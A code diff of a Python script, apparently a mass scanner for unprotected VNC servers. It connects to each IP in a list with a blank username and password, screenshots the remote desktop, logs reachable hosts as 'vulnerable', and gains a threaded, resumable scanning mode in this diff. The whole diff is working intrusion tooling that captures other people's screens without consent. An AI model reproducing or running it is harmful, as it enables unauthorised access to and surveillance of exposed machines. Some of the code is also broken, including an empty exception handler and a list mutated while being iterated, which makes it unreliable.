@@ -29,15 +29,42 @@ def attemptConnect(ips):
                             file.write(ip + "\n")
                             file.close()
 
-def linearAttemptConnect(searchingFile):
+def linearAttemptConnect(ips):
     #Similar to attemptConnect, however it removes the IP's already searched from their memory list 
     #and then saves the leftover IP's when the script is cancelled to the searchingFile
     #This script WILL REMOVE ips from the given file by overwriting them with the memory in the threads
     #However, this will be very very fast!
     global stopThreads
-     for ip in ips:
-        if not stopThreads:
-            pass
+    try:
+        for ip in ips:
+            if not stopThreads:
+                try:
+                    client = api.connect('{}:0'.format(ip),timeout=10, username='', password='')
+                    client.captureScreen('screenshot_IP_{}.png'.format(ip))
+                    print('Got image from {}'.format(ip))
+                    with FileLock("vulnerableIPs.txt.lock"): 
+                            with open('vulnerableIPs.txt', "a") as file: 
+                                file.write(ip + "\n")
+                                file.close() #TODO: is there even a point to close these?
+                except:
+                    print('Cant get image from {}'.format(ip))
+                    with FileLock("nonVulnerableIPs.txt.lock"):
+                            with open('nonVulnerableIPs.txt', "a") as file:
+                                file.write(ip + "\n")
+                                file.close()
+            ips.remove(ip)
+    except KeyboardInterrupt:
+         #We want to clear the current searchingFile and replace it with all the IPs currently in memory
+         
+
+def createSearchingFile(ipFile, searchingFile):
+    print("Linear searching detected. We will now create a text file that is a copy of your current IPs. Creating text file of IPs to search...")
+    with open(ipFile) as f:
+        lines = f.readlines()
+        for line in lines:
+            with open(searchingFile, "a") as file: 
+                file.write(line)
+    print("Text file of IPs created. Beginning linear search...")
 
 def createThread(maxThreads, ips):
         currentIndex = 0
@@ -69,7 +96,7 @@ def parseIPs(textfile):
                     print(line)
                     print("")
             f.close()
-            print("Done. Proceeding with screenshotting: ")
+            print("Done. Proceeding with screenshotting: \n")
     return ips
 
 def main():
@@ -80,11 +107,15 @@ def main():
     searchingFile = 'ipsLeft.txt' #basically the amount of ips left to search
     linear = True #set to false for non-linear searching with logging (very slow!)
 
-    ips_to_multithread = createThread(maxThreads, parseIPs(ipFile))
-
+    #if there is no searchingFile, create one with all the current ips
     if(linear):
         if not os.path.isfile(searchingFile):
-            createSearchingFile(ips)
+            createSearchingFile(ipFile, searchingFile)
+
+    if(linear):
+         ips_to_multithread = createThread(maxThreads, parseIPs(searchingFile))
+    else:
+         ips_to_multithread = createThread(maxThreads, parseIPs(ipFile))
 
     #Due to an issue in the underlying API, all threads must be restarted.
     #This will resolve issues involving Twisted timeout and such, as this API is not meant to be multithreaded
@@ -95,7 +126,7 @@ def main():
         for i in range(0, maxThreads):
 
             if(linear):
-                thread = threading.Thread(target=linearAttemptConnect, kwargs={'threadNum':i, 'searchingFile':searchingFile})
+                thread = threading.Thread(target=linearAttemptConnect, kwargs={'ips':ips_to_multithread[i]})
                 thread.start()
             else:
                 thread = threading.Thread(target=attemptConnect, kwargs={'ips':ips_to_multithread[i]})
